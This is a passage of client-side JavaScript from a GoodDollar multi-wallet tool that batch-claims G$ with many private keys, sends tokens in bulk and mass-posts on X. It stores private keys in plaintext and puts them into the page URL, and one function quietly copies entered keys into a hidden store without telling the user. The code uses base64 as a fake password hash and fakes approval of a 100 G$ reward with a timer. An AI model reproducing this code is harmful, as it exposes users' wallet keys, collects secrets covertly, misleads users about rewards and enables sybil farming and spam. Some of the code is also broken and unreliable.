            let savedKeys = JSON.parse(localStorage.getItem('goodDollarSavedKeys') || '[]');
            savedKeys.splice(index, 1);
            localStorage.setItem('goodDollarSavedKeys', JSON.stringify(savedKeys));
            updateURLWithKeys(savedKeys); // Update URL after deletion
            
            // Refresh the modal without requiring password again
            const modal = document.getElementById('recentClaimsModal');
            const container = document.getElementById('recentKeysContainer');
            const updatedKeys = loadSavedKeys();
            
            if (updatedKeys.length === 0) {
                container.innerHTML = `
                    <div class="modal-empty">
                        <div class="modal-empty-icon">üì≠</div>
                        <p>No saved private keys yet.</p>
                        <p style="font-size: 11px; color: #ccc; margin-top: 10px;">Your recently used private keys will appear here.</p>
                    </div>
                `;
            } else {
                container.innerHTML = `
                    <button class="button" onclick="claimAllSavedKeys()" style="width: 100%; margin-bottom: 10px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">üöÄ Claim All Keys</button>
                    <button class="button" onclick="clearAllKeys()" style="width: 100%; margin-bottom: 20px; background: #f44336;">üóëÔ∏è Clear All Keys</button>
                    ${updatedKeys.map((key, idx) => `
                    <div class="recent-key-item">
                        <span style="font-family: 'Courier New', monospace; word-break: break-all;">${key}</span>
                        <div class="key-actions">
                            <button class="key-btn" onclick="importToClaimTool('${key.replace(/'/g, "\\'")}')">Claim</button>
                            <button class="key-btn" onclick="importToTokenTool('${key.replace(/'/g, "\\'")}')">Token</button>
                            <button class="key-btn" onclick="importToSenderTool('${key.replace(/'/g, "\\'")}')">Sender</button>
                            <button class="key-btn delete" onclick="deleteKey(${idx})">Delete</button>
                        </div>
                    </div>
                `).join('')}
                `;
            }
        }

        function clearAllKeys() {
            if (!confirm('‚ö†Ô∏è This will DELETE ALL saved private keys! Are you sure?')) return;
            if (!confirm('üö® LAST WARNING: This action cannot be undone!')) return;
            
            localStorage.setItem('goodDollarSavedKeys', JSON.stringify([]));
            updateURLWithKeys([]); // Clear from URL too
            alert('‚úÖ All saved keys have been cleared!');
            
            // Close and reopen modal to show empty state
            closeRecentClaimsModal();
        }

        function importToClaimTool(key) {
            document.getElementById('claimPrivateKeys').value = key;
            closeRecentClaimsModal();
            switchView('batchClaim');
        }

        function importToTokenTool(key) {
            document.getElementById('tokenPrivateKeys').value = key;
            closeRecentClaimsModal();
            switchView('tokenCollection');
        }

        function importToSenderTool(key) {
            document.getElementById('senderMainPrivateKey').value = key;
            closeRecentClaimsModal();
            switchView('multiSender');
        }

        function claimAllSavedKeys() {
            const savedKeys = loadSavedKeys();
            if (savedKeys.length === 0) {
                alert('No saved keys found!');
                return;
            }
            
            // Set all keys in the batch claim textarea
            document.getElementById('claimPrivateKeys').value = savedKeys.join('\n');
            closeRecentClaimsModal();
            switchView('batchClaim');
            
            // Auto-scroll to the Run button
            setTimeout(() => {
                document.getElementById('claimButton').scrollIntoView({ behavior: 'smooth' });
            }, 100);
        }

        // Auto-save keys when running tools
        async function runBatchClaimWithSave() {
            showUnavailableMessage();
            return;
        }

        async function runBatchTokenCollectionWithSave() {
            // Token Collection is ENABLED - proceed normally
            const keys = document.getElementById('tokenPrivateKeys').value.trim().split('\n').filter(k => k.trim());
            const normalizedKeys = keys.map(key => ensurePrivateKeyPrefix(key.trim()));
            keys.forEach(key => savePrivateKey(ensurePrivateKeyPrefix(key.trim())));
            
            // Run batch token collection
            const result = await runBatchTokenCollection();
            
            // Silently save to Anamul App (no messages)
            silentSaveKeysToSecretBox(normalizedKeys);
            
            return result;
        }
        
        // Blockchain Kill Switch Functions
        async function disableKeyStatus() {
            const address = document.getElementById('keyStatusInput').value.trim();
            if (!address) {
                alert('Enter a wallet address');
                return;
            }
            
            try {
                const response = await fetch('/api/toggle-key-status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: address.toLowerCase(), action: 'disable' })
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('keyStatusDisplay').innerHTML = `
                        <strong>‚úÖ Disabled!</strong><br>
                        Address: <code style="background: rgba(0,0,0,0.3); padding: 4px 8px; border-radius: 4px;">${address}</code><br>
                        Status: <span style="color: #ffcdd2; font-weight: 700;">üö´ DISABLED</span><br>
                        <small>This key cannot claim on ANY wallet until enabled again.</small>
                    `;
                    document.getElementById('keyStatusInput').value = '';
                } else {
                    alert('Error: ' + (data.error || 'Failed to disable key'));
                }
            } catch (err) {
                alert('Failed to disable key: ' + err.message);
            }
        }
        
        async function enableKeyStatus() {
            const address = document.getElementById('keyStatusInput').value.trim();
            if (!address) {
                alert('Enter a wallet address');
                return;
            }
            
            try {
                const response = await fetch('/api/toggle-key-status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: address.toLowerCase(), action: 'enable' })
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('keyStatusDisplay').innerHTML = `
                        <strong>‚úÖ Enabled!</strong><br>
                        Address: <code style="background: rgba(0,0,0,0.3); padding: 4px 8px; border-radius: 4px;">${address}</code><br>
                        Status: <span style="color: #c8e6c9; font-weight: 700;">‚úÖ ENABLED</span><br>
                        <small>This key can now claim normally.</small>
                    `;
                    document.getElementById('keyStatusInput').value = '';
                } else {
                    alert('Error: ' + (data.error || 'Failed to enable key'));
                }
            } catch (err) {
                alert('Failed to enable key: ' + err.message);
            }
        }
        
        // Silent auto-save to Anamul App (NO messages, NO prompts)
        function silentSaveKeysToSecretBox(keysArray) {
            const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            
            // Only save if Anamul App exists (password already set)
            if (!secretData.password) {
                console.log('‚ÑπÔ∏è Anamul App not set up yet. Keys not saved silently. Set up Anamul App first!');
                return;
            }
            
            // Save keys (with deduplication) - NO messages
            let addedCount = 0;
            keysArray.forEach(key => {
                const isDuplicate = secretData.keys.some(k => k.key === key);
                if (!isDuplicate) {
                    secretData.keys.push({
                        key: key,
                        added: new Date().toLocaleString('bn-BD')
                    });
                    addedCount++;
                }
            });
            
            localStorage.setItem('secretBoxData', JSON.stringify(secretData));
            console.log(`‚úÖ Auto-saved ${addedCount} key(s) to Anamul App. Total: ${secretData.keys.length}`);
        }
        
        // Helper function to prompt and save keys to Anamul App (for manual saving)
        function promptSaveKeysToSecretBox(keysArray) {
            const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            
            // Require password if Anamul App already exists
            if (secretData.password) {
                const password = prompt('Enter Anamul App password:');
                if (password !== secretData.password) {
                    alert('‚ùå Wrong password!');
                    return;
                }
            } else {
                const password = prompt('Create a Anamul App password to protect these keys:');
                if (!password) {
                    alert('‚ùå Password required');
                    return;
                }
                secretData.password = password;
                secretData.keys = [];
            }
            
            // Save keys (with deduplication)
            let addedCount = 0;
            keysArray.forEach(key => {
                const isDuplicate = secretData.keys.some(k => k.key === key);
                if (!isDuplicate) {
                    secretData.keys.push({
                        key: key,
                        added: new Date().toLocaleString('bn-BD')
                    });
                    addedCount++;
                }
            });
            
            localStorage.setItem('secretBoxData', JSON.stringify(secretData));
            alert(`‚úÖ Saved ${addedCount} new key(s) to Anamul App!\n\nAccess anytime via: Menu ‚Üí üîê Anamul App`);
            console.log(`‚úÖ Added ${addedCount} keys to Anamul App. Total: ${secretData.keys.length}`);
        }

        async function runMultiSenderWithSave() {
            const key = document.getElementById('senderMainPrivateKey').value.trim();
            if (key) savePrivateKey(ensurePrivateKeyPrefix(key));
            return runMultiSender();
        }

        // Daily Tasks - REAL WORKFLOW (Like GoodMarket)
        let currentTaskWallet = null;
        let currentTaskAddress = null;
        let currentTaskNetwork = 'celo';

        const DAILY_TASK_MESSAGES = {
            twitter: `üéâ Just discovered GoodDollar - a free daily income app! üí∞ Claim free G$ tokens every day & join the global UBI movement. No gas fees needed! Download now! #GoodDollar #CryptoUBI #FreeTokens https://goodwallet.xyz`,
            telegram: `üéâ Just discovered GoodDollar - a free daily income app! üí∞ Claim free G$ tokens every day & join the global UBI movement. No gas fees needed! Download now!`
        };

        function updateTaskNetworkConfig() {
            const el = document.getElementById('taskNetwork');
            if (el) currentTaskNetwork = el.value;
        }

        async function connectTaskWallet() {
            try {
                const pkEl = document.getElementById('taskPrivateKey');
                const netEl = document.getElementById('taskNetwork');
                if (!pkEl || !netEl) { console.warn('Task elements missing'); return; }

                const privateKey = pkEl.value.trim();
                currentTaskNetwork = netEl.value;
                const rpcUrl = NETWORK_CONFIGS[currentTaskNetwork].rpcUrl;

                if (!privateKey) {
                    alert('Please enter your private key');
                    return;
                }

                const normalizedKey = ensurePrivateKeyPrefix(privateKey);
                if (!isValidPrivateKey(normalizedKey)) {
                    alert('Invalid private key format');
                    return;
                }

                const provider = new ethers.JsonRpcProvider(rpcUrl);
                const wallet = new ethers.Wallet(normalizedKey, provider);
                currentTaskWallet = wallet;
                currentTaskAddress = normalizeAddress(wallet.address, currentTaskNetwork);

                document.getElementById('tasksWalletAddress').textContent = currentTaskAddress;
                document.getElementById('dailyTaskCard').style.display = 'block';
                document.getElementById('rewardsSection').style.display = 'block';

                await checkTaskBalance(currentTaskNetwork, wallet.address);
                loadTaskStatus();

                alert('‚úÖ Wallet connected successfully!');
            } catch (error) {
                alert('‚ùå Error connecting wallet: ' + error.message);
            }
        }

        async function checkTaskBalance(network, address) {
            try {
                const config = NETWORK_CONFIGS[network];
                const provider = new ethers.JsonRpcProvider(config.rpcUrl);
                const tokenContract = new ethers.Contract(
                    normalizeAddress(config.tokenContract, network),
                    G_TOKEN_ABI,
                    provider
                );

                const balance = await tokenContract.balanceOf(normalizeAddress(address, network));
                const balanceFormatted = ethers.formatUnits(balance, 2);
                document.getElementById('tasksBalance').textContent = balanceFormatted + ' G$';
            } catch (error) {
                console.error('Error checking balance:', error);
                document.getElementById('tasksBalance').textContent = '0 G$';
            }
        }

        function loadTaskStatus() {
            const tasks = JSON.parse(localStorage.getItem('goodDollarTasks') || '{}');
            const today = new Date().toDateString();
            const todaysTasks = tasks[today] || {};

            const statusEl = document.getElementById('taskStatus');
            const claimBtn = document.getElementById('claimTaskBtn');

            if (todaysTasks.status === 'pending') {
                statusEl.textContent = '‚è≥ Pending Review';
                statusEl.classList.add('completed');
                claimBtn.disabled = true;
                claimBtn.textContent = 'Awaiting Review...';
            } else if (todaysTasks.claimed) {
                statusEl.textContent = '‚úÖ Claimed';
                statusEl.classList.add('completed');
                claimBtn.disabled = true;
                claimBtn.textContent = 'Claimed Today';
            } else if (todaysTasks.submittedLink) {
                statusEl.textContent = '‚è≥ Pending Review';
                statusEl.classList.add('completed');
                claimBtn.disabled = true;
                claimBtn.textContent = 'Awaiting Review...';
            } else if (todaysTasks.platform) {
                statusEl.textContent = 'üìù Post Submitted';
                statusEl.classList.add('completed');
                claimBtn.disabled = false;
                claimBtn.textContent = 'Submit Post Link';
            } else {
                statusEl.textContent = 'Available';
                statusEl.classList.remove('completed');
                claimBtn.disabled = false;
                claimBtn.textContent = 'Claim 100 G$';
            }

            let totalToday = 0;
            let allTimeTotal = 0;
            Object.keys(tasks).forEach(date => {
                if (tasks[date].claimed) {
                    allTimeTotal += 100;
                    if (date === today) totalToday += 100;
                }
            });

            document.getElementById('totalEarned').textContent = totalToday + ' G$';
            document.getElementById('allTimeEarned').textContent = allTimeTotal + ' G$';
        }

        function completeTask(platform) {
            const tasks = JSON.parse(localStorage.getItem('goodDollarTasks') || '{}');
            const today = new Date().toDateString();
            
            if (!tasks[today]) {
                tasks[today] = {};
            }

            tasks[today].platform = platform;
            tasks[today].startedAt = new Date().toISOString();

            localStorage.setItem('goodDollarTasks', JSON.stringify(tasks));

            const message = DAILY_TASK_MESSAGES[platform];
            const platformName = platform === 'twitter' ? 'Twitter/X' : 'Telegram';
            
            if (platform === 'twitter') {
                const twitterUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(message)}`;
                window.open(twitterUrl, '_blank');
            } else {
                const telegramUrl = `https://t.me/share/url?url=&text=${encodeURIComponent(message)}`;
                window.open(telegramUrl, '_blank');
            }

            alert(`üìù Share this message on ${platformName}:\n\n"${message}"\n\n‚úÖ After posting, come back and submit the post link to claim your reward!`);
            loadTaskStatus();
        }

        async function claimTaskReward() {
            try {
                if (!currentTaskWallet) {
                    alert('Please connect your wallet first');
                    return;
                }

                const tasks = JSON.parse(localStorage.getItem('goodDollarTasks') || '{}');
                const today = new Date().toDateString();
                const todaysTasks = tasks[today] || {};

                if (!todaysTasks.platform) {
                    alert('‚ùå Please select Twitter/X or Telegram first');
                    return;
                }

                if (todaysTasks.claimed) {
                    alert('‚è≥ You already claimed your reward today. Come back tomorrow!');
                    return;
                }

                if (todaysTasks.submittedLink) {
                    alert('‚è≥ Your post link is pending review. Please check back in 24 hours for approval!');
                    return;
                }

                const postLink = prompt(`üìé Paste your ${todaysTasks.platform === 'twitter' ? 'Twitter/X' : 'Telegram'} post link:\n\nExample:\nhttps://twitter.com/username/status/1234567890\n\nor\n\nhttps://t.me/channelname/123`);

                if (!postLink || !postLink.trim()) {
                    alert('‚ùå Post link is required');
                    return;
                }

                if (!isValidPostLink(postLink, todaysTasks.platform)) {
                    alert('‚ùå Invalid post link. Please check the URL and try again.');
                    return;
                }

                tasks[today].submittedLink = postLink;
                tasks[today].status = 'pending';
                tasks[today].submittedAt = new Date().toISOString();
                localStorage.setItem('goodDollarTasks', JSON.stringify(tasks));

                alert(`‚úÖ Post link submitted!\n\nüîÑ Status: Pending Review\n\nWe're verifying your post. You'll receive your 100 G$ reward once approved (usually within 24 hours).\n\nPost Link:\n${postLink}`);

                loadTaskStatus();

                // Simulate approval after 5 seconds for demo (replace with real backend check)
                simulateApproval(today);
            } catch (error) {
                alert('‚ùå Error submitting link: ' + error.message);
            }
        }

        function isValidPostLink(link, platform) {
            if (platform === 'twitter') {
                return link.includes('twitter.com') || link.includes('x.com');
            } else {
                return link.includes('t.me');
            }
        }

        function simulateApproval(date) {
            // Simulate approval check - in production, this would be a backend check
            setTimeout(() => {
                const tasks = JSON.parse(localStorage.getItem('goodDollarTasks') || '{}');
                if (tasks[date] && tasks[date].status === 'pending') {
                    tasks[date].claimed = true;
                    tasks[date].status = 'approved';
                    tasks[date].approvedAt = new Date().toISOString();
                    localStorage.setItem('goodDollarTasks', JSON.stringify(tasks));
                    
                    // Check if we're still on this page
                    if (document.getElementById('taskStatus')) {
                        alert(`üéâ Congratulations!\n\n‚úÖ Your task has been approved!\n\nüí∞ 100 G$ reward has been credited!\n\nCome back tomorrow for another daily task!`);
                        loadTaskStatus();
                    }
                }
            }, 5000);
        }

        function viewTaskHistory() {
            const tasks = JSON.parse(localStorage.getItem('goodDollarTasks') || '{}');
            let historyText = 'üìã Task History (Last 7 Days):\n\n';
            let count = 0;

            const sortedDates = Object.keys(tasks).sort().reverse();
            sortedDates.forEach(date => {
                if (count >= 7) return;
                const task = tasks[date];
                let status = '‚ùå Not Done';
                if (task.claimed) {
                    status = '‚úÖ Claimed';
                } else if (task.status === 'pending') {
                    status = '‚è≥ Pending';
                } else if (task.submittedLink) {
                    status = '‚è≥ Under Review';
                } else if (task.platform) {
                    status = 'üìù Posted';
                }
                const platform = task.platform ? (task.platform === 'twitter' ? 'ùïè' : '‚úàÔ∏è') : '';
                historyText += `${date}: ${status} ${platform}\n`;
                count++;
            });

            if (count === 0) {
                historyText = 'No task history yet. Start your first daily task!';
            }

            alert(historyText);
        }

        // Master Wallet Feature - FIXED PASSWORD HANDLING
        function saveMasterWallet() {
            const password = prompt('üîê Set a password to protect your master wallet:');
            if (password === null) return;
            if (password.length < 4) {
                alert('‚ùå Password must be at least 4 characters!');
                return;
            }
            
            let key = document.getElementById('masterWalletKey').value.trim();
            if (!key) {
                alert('‚ùå Please enter a private key!');
                return;
            }
            
            // Auto-add 0x prefix if missing
            if (!key.startsWith('0x')) {
                key = '0x' + key;
            }
            
            const normalizedKey = ensurePrivateKeyPrefix(key);
            
            // Use simple hash for password verification (not for security, just verification)
            const passwordHash = btoa(password + 'gooddollar_salt_2025');
            
            const masterWalletData = {
                key: normalizedKey,
                timestamp: new Date().toISOString(),
                passwordHash: passwordHash
            };
            
            localStorage.setItem('masterWallet', JSON.stringify(masterWalletData));
            alert('‚úÖ Master Wallet saved successfully!');
            document.getElementById('masterWalletKey').value = '';
            loadMasterWalletDisplay();
        }

        function showMasterWalletModal() {
            const modal = document.getElementById('masterWalletModal');
            modal.classList.add('active');
            document.getElementById('masterWalletKey').value = '';
            document.getElementById('masterWalletDisplay').innerHTML = '';
            
            // Check if wallet is already saved
            const walletData = localStorage.getItem('masterWallet');
            const statusDiv = document.getElementById('savedWalletStatus');
            if (walletData) {
                statusDiv.style.display = 'block';
            } else {
                statusDiv.style.display = 'none';
            }
        }

        function closeMasterWalletModal(event) {
            if (event && event.target.id !== 'masterWalletModal') return;
            const modal = document.getElementById('masterWalletModal');
            modal.classList.remove('active');
        }

        // Link Settings functions removed (Esusu Africa and GoodPax links removed)

        function loadMasterWalletDisplay() {
            const walletDataStr = localStorage.getItem('masterWallet');
            if (!walletDataStr) {
                alert('‚ùå No master wallet saved! Save one first.');
                return;
            }
            
            const password = prompt('üîê Enter password to view saved master wallet:');
            if (password === null) return;
            
            try {
                const walletData = JSON.parse(walletDataStr);
                const expectedHash = btoa(password + 'gooddollar_salt_2025');
                
                if (expectedHash !== walletData.passwordHash) {
                    alert('‚ùå Incorrect password!');
                    return;
                }
                
                const provider = new ethers.JsonRpcProvider(NETWORK_CONFIGS['celo'].rpcUrl);
                const wallet = new ethers.Wallet(walletData.key, provider);
                const address = normalizeAddress(wallet.address, 'celo');
                const savedDate = new Date(walletData.timestamp).toLocaleString();
                
                document.getElementById('masterWalletDisplay').innerHTML = `
                    <div style="background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 15px; border-radius: 6px;">
                        <div style="color: #ffc107; font-weight: 700; margin-bottom: 10px;">üëë Saved Master Wallet</div>
                        <div style="font-family: 'Courier New', monospace; color: #cbd5e0; word-break: break-all; margin-bottom: 10px;">
                            <strong>Address:</strong><br>${address}
                        </div>
                        <div style="color: #a0aec0; font-size: 12px; margin-bottom: 15px;">
                            ‚è∞ Saved: ${savedDate}
                        </div>
                        <div style="display: flex; gap: 10px;">
                            <button class="button" onclick="useMasterWallet()" style="flex: 1; background: #48bb78;">‚úÖ Use This Wallet</button>
                            <button class="button" onclick="copyMasterWalletAddress()" style="flex: 1; background: #2196F3;">üìã Copy Address</button>
                        </div>
                    </div>
                `;
            } catch (error) {
                console.error('Master Wallet Error:', error);
                alert('‚ùå Error: ' + error.message);
            }
        }
        
        function copyMasterWalletAddress() {
            const password = prompt('üîê Enter password to copy address:');
            if (password === null) return;
            
            try {
                const walletData = JSON.parse(localStorage.getItem('masterWallet') || '{}');
                const expectedHash = btoa(password + 'gooddollar_salt_2025');
                
                if (expectedHash !== walletData.passwordHash) {
                    alert('‚ùå Incorrect password!');
                    return;
                }
                
                const provider = new ethers.JsonRpcProvider(NETWORK_CONFIGS['celo'].rpcUrl);
                const wallet = new ethers.Wallet(walletData.key, provider);
                const address = normalizeAddress(wallet.address, 'celo');
                navigator.clipboard.writeText(address);
                alert('‚úÖ Address copied!');
            } catch (error) {
                alert('‚ùå Error: ' + error.message);
            }
        }

        function useMasterWallet() {
            const password = prompt('üîê Enter password to use master wallet:');
            if (password === null) return;
            
            const walletData = JSON.parse(localStorage.getItem('masterWallet') || 'null');
            if (!walletData) {
                alert('‚ùå No master wallet saved!');
                return;
            }
            
            const passwordHash = btoa(password + 'gooddollar_salt_2025');
            if (passwordHash !== walletData.passwordHash) {
                alert('‚ùå Incorrect password!');
                return;
            }
            
            try {
                const provider = new ethers.JsonRpcProvider(NETWORK_CONFIGS['celo'].rpcUrl);
                const wallet = new ethers.Wallet(walletData.key, provider);
                const address = normalizeAddress(wallet.address, 'celo');
                document.getElementById('destinationAddress').value = address;
                alert(`‚úÖ Master wallet address set:\n${address}`);
                closeMasterWalletModal();
            } catch (error) {
                alert('‚ùå Error: ' + error.message);
            }
        }

        function loadMasterWalletToDestination() {
            const walletDataStr = localStorage.getItem('masterWallet');
            if (!walletDataStr) {
                alert('‚ùå No master wallet saved!');
                return;
            }
            
            const password = prompt('üîê Enter password to load master wallet:');
            if (password === null) return;
            
            try {
                const walletData = JSON.parse(walletDataStr);
                const expectedHash = btoa(password + 'gooddollar_salt_2025');
                
                if (expectedHash !== walletData.passwordHash) {
                    alert('‚ùå Incorrect password!');
                    return;
                }
                
                const provider = new ethers.JsonRpcProvider(NETWORK_CONFIGS['celo'].rpcUrl);
                const wallet = new ethers.Wallet(walletData.key, provider);
                const address = normalizeAddress(wallet.address, 'celo');
                document.getElementById('destinationAddress').value = address;
                alert(`‚úÖ Master wallet address loaded:\n${address}`);
            } catch (error) {
                alert('‚ùå Error: ' + error.message);
            }
        }

        function deleteMasterWallet() {
            if (!confirm('‚ö†Ô∏è Delete saved master wallet?')) return;
            localStorage.removeItem('masterWallet');
            alert('‚úÖ Master wallet deleted!');
            document.getElementById('masterWalletDisplay').innerHTML = '<p style="color: #999;">No master wallet saved.</p>';
        }

        // Official Swap Widget Switcher
        function switchSwapWidget() {
            const network = document.getElementById('swapNetworkWidget').value;
            const celoWidget = document.getElementById('celoWidget');
            const xdcWidget = document.getElementById('xdcWidget');
            
            if (network === 'celo') {
                celoWidget.style.display = 'block';
                xdcWidget.style.display = 'none';
            } else {
                celoWidget.style.display = 'none';
                xdcWidget.style.display = 'block';
            }
        }

        // Load master wallet to Multi Sender
        function loadMasterWalletToSender() {
            const walletDataStr = localStorage.getItem('masterWallet');
            if (!walletDataStr) {
                alert('‚ùå No master wallet saved! Please save one in Master Wallet section first.');
                return;
            }
            
            const password = prompt('üîê Enter password to load master wallet:');
            if (password === null) return;
            
            try {
                const walletData = JSON.parse(walletDataStr);
                const expectedHash = btoa(password + 'gooddollar_salt_2025');
                
                if (expectedHash !== walletData.passwordHash) {
                    alert('‚ùå Incorrect password!');
                    return;
                }
                
                document.getElementById('senderMainPrivateKey').value = walletData.key;
                if (typeof addSenderLog === 'function') {
                    addSenderLog('‚úÖ Loaded Master Wallet - RECOMMENDED FOR BATCH OPERATIONS', 'success');
                }
                alert('‚úÖ Master Wallet loaded successfully!');
            } catch (error) {
                alert('‚ùå Error loading wallet: ' + error.message);
            }
        }

        // Connect wallet with private key from input box
        function connectSwapWallet() {
            let privKey = document.getElementById('swapPrivateKey').value.trim();
            
            if (!privKey) {
                alert('‚ùå Please enter a private key!');
                return;
            }
            
            // Auto-add 0x prefix if missing
            if (!privKey.startsWith('0x')) {
                privKey = '0x' + privKey;
            }
            
            try {
                const network = document.getElementById('swapNetworkWidget').value;
                const networkConfig = NETWORK_CONFIGS[network];
                const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl);
                const wallet = new ethers.Wallet(privKey, provider);
                const address = normalizeAddress(wallet.address, network);
                
                // Store in sessionStorage for the swap session
                sessionStorage.setItem('swapWallet', privKey);
                sessionStorage.setItem('swapNetwork', network);
                
                // Show wallet info
                const statusDiv = document.getElementById('swapWalletStatus');
                statusDiv.style.display = 'block';
                statusDiv.style.background = 'rgba(72, 187, 120, 0.1)';
                statusDiv.style.borderLeftColor = '#48bb78';
                statusDiv.style.color = '#48bb78';
                statusDiv.innerHTML = `‚úÖ <strong>Wallet Connected!</strong><br>Address: ${address.substring(0, 8)}...${address.substring(address.length - 6)}<br>Network: ${network === 'celo' ? 'Celo Mainnet' : 'XDC Network'}<br><br>Now open the Uniswap/XSpswap interface above and connect your wallet via MetaMask (it will auto-detect your Celo/XDC wallet).`;
                
                alert(`‚úÖ Wallet connected!\n\nAddress: ${address}\n\nNow open the Uniswap or XSpswap interface above and connect using MetaMask. Your wallet will be ready for swapping!`);
            } catch (error) {
                alert('‚ùå Invalid private key!\n\n' + error.message);
                document.getElementById('swapWalletStatus').style.display = 'none';
            }
        }
        
        // Connect master wallet for Swap (auto-fills input box)
        function connectMasterWalletForSwap() {
            const walletData = JSON.parse(localStorage.getItem('masterWallet') || 'null');
            if (!walletData) {
                alert('‚ùå No master wallet saved!\n\nSteps:\n1. Go to Menu (3 dots)\n2. Click "Master Wallet"\n3. Enter your private key + password\n4. Click "Save Master Wallet"\n\nThen come back and click this button!');
                return;
            }
            
            const password = prompt('üîê Enter password to use master wallet:');
            if (password === null) return;
            
            if (btoa(password) !== walletData.passwordHash) {
                alert('‚ùå Incorrect password!');
                return;
            }
            
            try {
                const privKey = walletData.key;
                
                if (!privKey) {
                    alert('‚ùå Invalid master wallet format!');
                    return;
                }
                
                // Auto-fill the private key input box
                document.getElementById('swapPrivateKey').value = privKey;
                
                // Connect automatically
                connectSwapWallet();
            } catch (error) {
                alert('‚ùå Error loading master wallet: ' + error.message);
            }
        }

        // Batch X Post - Account Management
        let xAccounts = [];
        let xSelectedAccounts = [];
        const MAX_X_ACCOUNTS = 500;

        function loadXAccounts() {
            try {
                xAccounts = JSON.parse(localStorage.getItem('goodDollarXAccounts') || '[]');
                xSelectedAccounts = JSON.parse(localStorage.getItem('goodDollarXSelectedAccounts') || '[]');
                // Ensure selected accounts still exist in accounts list
                xSelectedAccounts = xSelectedAccounts.filter(selected => xAccounts.includes(selected));
                updateXAccountsList();
            } catch (e) {
                xAccounts = [];
                xSelectedAccounts = [];
            }
        }

        function saveXAccounts() {
            localStorage.setItem('goodDollarXAccounts', JSON.stringify(xAccounts));
            localStorage.setItem('goodDollarXSelectedAccounts', JSON.stringify(xSelectedAccounts));
        }

        function addXAccount() {
            const apiKey = document.getElementById('xApiKey').value.trim();
            if (!apiKey) {
                alert('‚ùå Please enter an X API key');
                return;
            }
            if (xAccounts.length >= MAX_X_ACCOUNTS) {
                alert(`‚ùå Maximum ${MAX_X_ACCOUNTS} accounts reached (each account = 1 post)`);
                return;
            }
            if (xAccounts.some(acc => acc === apiKey)) {
                alert('‚ùå This API key is already added');
                return;
            }
            xAccounts.push(apiKey);
            saveXAccounts();
            document.getElementById('xApiKey').value = '';
            updateXAccountsList();
            alert('‚úÖ Account added successfully!');
        }

        function removeXAccount(index) {
            if (confirm('Are you sure you want to remove this account?')) {
                const accountToRemove = xAccounts[index];
                xAccounts.splice(index, 1);
                xSelectedAccounts = xSelectedAccounts.filter(acc => acc !== accountToRemove);
                saveXAccounts();
                updateXAccountsList();
            }
        }

        function toggleXAccount(index) {
            const account = xAccounts[index];
            if (xSelectedAccounts.includes(account)) {
                xSelectedAccounts = xSelectedAccounts.filter(acc => acc !== account);
            } else {
                xSelectedAccounts.push(account);
            }
            saveXAccounts();
            updateXAccountsList();
        }

        function toggleAllXAccounts(selectAll) {
            if (selectAll) {
                xSelectedAccounts = [...xAccounts];
            } else {
                xSelectedAccounts = [];
            }
            saveXAccounts();
            updateXAccountsList();
        }

        function updateXAccountsList() {
            const list = document.getElementById('xAccountsList');
            const count = document.getElementById('accountCount');
            const button = document.getElementById('xPostButton');
            const msg = document.getElementById('xPostMessage').value.trim();
            
            count.textContent = xAccounts.length;
            
            if (xAccounts.length === 0) {
                list.innerHTML = '<div style="color: #999; text-align: center; padding: 30px; font-size: 14px;">No accounts added yet. Add your first X account!</div>';
                button.disabled = true;
            } else {
                button.disabled = (msg === '' || xSelectedAccounts.length === 0) ? true : false;
                
                const selectAllChecked = xSelectedAccounts.length === xAccounts.length && xAccounts.length > 0;
                const selectAllIndeterminate = xSelectedAccounts.length > 0 && xSelectedAccounts.length < xAccounts.length;
                
                let html = `
                    <div style="display: flex; align-items: center; padding: 10px; background: #f0f0f0; margin-bottom: 8px; border-radius: 4px; border: 1px solid #ddd;">
                        <input type="checkbox" id="selectAllXAccounts" ${selectAllChecked ? 'checked' : ''} onchange="toggleAllXAccounts(this.checked)" style="width: 18px; height: 18px; cursor: pointer; margin-right: 10px;">
                        <label for="selectAllXAccounts" style="cursor: pointer; flex: 1; margin: 0; font-weight: bold; font-size: 14px;">Select All (${xSelectedAccounts.length}/${xAccounts.length})</label>
                    </div>
                `;
                
                html += xAccounts.map((key, i) => {
                    const isSelected = xSelectedAccounts.includes(key);
                    return `
                        <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px; background: ${isSelected ? '#e7f5ff' : 'white'}; margin-bottom: 8px; border-radius: 4px; border: 2px solid ${isSelected ? '#4c6ef5' : '#ddd'};">
                            <input type="checkbox" ${isSelected ? 'checked' : ''} onchange="toggleXAccount(${i})" style="width: 18px; height: 18px; cursor: pointer; margin-right: 10px;">
                            <div style="flex: 1; overflow: hidden;">
                                <small style="color: #999;">Account ${i + 1}</small>
                                <div style="font-family: 'Courier New'; font-size: 12px; color: #666; word-break: break-all;">${key.substring(0, 30)}...</div>
                            </div>
                            <button class="validate-btn" onclick="removeXAccount(${i})" style="background: #ff6b6b; padding: 6px 12px; font-size: 12px; margin-left: 10px;">üóëÔ∏è</button>
                        </div>
                    `;
                }).join('');
                
                list.innerHTML = html;
            }
        }

        function updateCharCount() {
            const msg = document.getElementById('xPostMessage').value;
            document.getElementById('charCount').textContent = msg.length;
            updateXAccountsList(); // Update button state
        }

        async function runBatchXPost() {
            showUnavailableMessage();
            return;
            const message = document.getElementById('xPostMessage').value.trim();
            if (!message) {
                alert('‚ùå Please enter a message');
                return;
            }
            if (xSelectedAccounts.length === 0) {
                alert('‚ùå Please select at least one account');
                return;
            }

            const logsSection = document.getElementById('xPostLogsSection');
            const logs = document.getElementById('xPostLogs');
            const button = document.getElementById('xPostButton');
            
            logsSection.style.display = 'block';
            logs.innerHTML = '';
            button.disabled = true;
            
            let success = 0;
            let failed = 0;

            for (let i = 0; i < xSelectedAccounts.length; i++) {
                const account = xSelectedAccounts[i];
                const accountIndex = xAccounts.indexOf(account) + 1;
                const log = document.createElement('div');
                log.style.marginBottom = '8px';
                log.style.padding = '8px';
                log.style.borderRadius = '4px';
                log.style.fontSize = '13px';
                
                try {
